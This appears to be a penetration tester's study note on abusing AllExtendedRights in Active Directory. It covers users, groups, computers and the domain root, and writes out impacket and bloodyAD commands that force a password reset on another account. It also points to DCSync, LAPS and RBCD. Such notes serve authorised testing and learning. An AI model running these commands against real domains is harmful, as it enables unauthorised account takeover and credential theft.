You have all extended control-access rights on the target object. The actual opportunity depends on which object you have the permission over.

- **User:** ForceChangePassword.
- **Group:** No direct membership modification.
- **Computer:** Check applicable LAPS/password-reset extended rights.
- **Domain:** DCSync.

#### **If target is a User:** 
1. [[ForceChangePassword]]

### ForceChangePassword
```
impacket-changepasswd -reset -protocol smb-samr 'corp.local/bob@DCIP' -newpass 'NewPassword123!' -altuser 'corp.local/alice' -altpass 'Password123!'
```

or 

```
bloodyAD -d corp.local --host <DC_IP> -u alice -p 'Password123!' set password bob 'NewPassword123!'
```

Then authenticate as Bob using the new password.

---
#### **If target is a Group:** 

AllExtendedRights over a group does **not** automatically let you add yourself to it.

Group membership modification involves writing the group's `member` attribute.

You would generally need:

- GenericAll
- GenericWrite (if effective for the attribute)
- WriteProperty over `member`
- Another applicable membership permission

**For your notes:** Don't list group membership modification as a standard AllExtendedRights attack.

---
#### **If target is a Computer:** 

[[LAPS]]
[[RBCD]]


---

#### **If target is a Domain Object:** 

If you have AllExtendedRights over the domain root object, you can obtain the two replication permissions needed for DCSync:

1. `DS-Replication-Get-Changes`
2. `DS-Replication-Get-Changes-All`

[[DCSync]]